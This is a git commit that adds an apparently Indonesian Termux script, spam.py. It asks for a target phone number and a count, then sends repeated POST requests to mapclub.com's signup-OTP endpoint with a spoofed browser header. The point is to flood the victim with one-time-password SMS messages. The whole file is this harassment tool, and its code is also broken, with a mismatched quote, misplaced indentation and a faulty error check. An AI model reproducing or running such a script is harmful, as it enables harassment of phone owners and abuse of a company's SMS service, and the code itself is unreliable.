8afe139a7b4b2d84115c0861e8e83cdc922cf2ab
GRCR4K3R <94230332+GRCR4K3R@users.noreply.github.com>
2021-11-19 16:18:17 +0700

    Create spam.py

---
+++ spam.py
@@ -0,0 +1,46 @@
+#!/bin/python
+
+#module
+import json
+import requests
+import sys
+import os
+
+def main():
+  os.system('clear')
+  os.system('figlet Spam Pesan')
+  banner = '''
+=======================================
+=    (+)Author    : Reza Alfauzan     =
+=    (+)Youtube   : Reja Gaming       =
+=    (+)Facebook  : Rzaa Ajaa         =
+=    (+)Pesan     : Jangan Recode Ya  =
+=======================================
+====> Coded By Reza <====
+> Welcome To Termux <
+====> Gua Ganteng:v <====
+'''
+  
+  print(banner)
+  no = input('Nomor Target ==> : ')
+  jum = input('Jumlah Spam ==> :')
+  
+  head = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
+    "Referer": "https://www.mapclub.com/en/user/signup",
+    "Host: "cmsapi.mapclub.com",
+  }
+  
+  dat = {
+    'phone' : no
+  }
+  
+  for x in range(int(jum)):
+    leosureo =requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
+    if 'error' in leosureo:
+      print('Gagal Mengirimn:)' + no)
+      else:
+        print('Berhasil Mengirim :' + no)
+        
+        
+        main()
